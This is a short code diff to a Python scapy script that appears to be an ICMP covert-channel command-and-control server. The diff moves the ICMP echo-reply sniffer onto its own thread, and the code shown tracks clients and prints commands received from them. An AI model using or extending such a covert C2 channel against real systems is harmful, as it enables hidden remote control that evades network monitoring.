@@ -1,6 +1,7 @@
 from scapy.all import * 
 from scapy.all import ICMP,IP
 import json
+import threading
 
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = True                # Set to display statements specific to debugging issues
@@ -124,8 +125,11 @@ def listen(pkt):
     command = parsed[1][:-1]
     print(f"Recieved: {command} from {src}")
 
-def main():
+def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
+
+def main():
+    threading.Thread(target=sniffer).start()
     clients = dict()
     id = 0
     while(True):
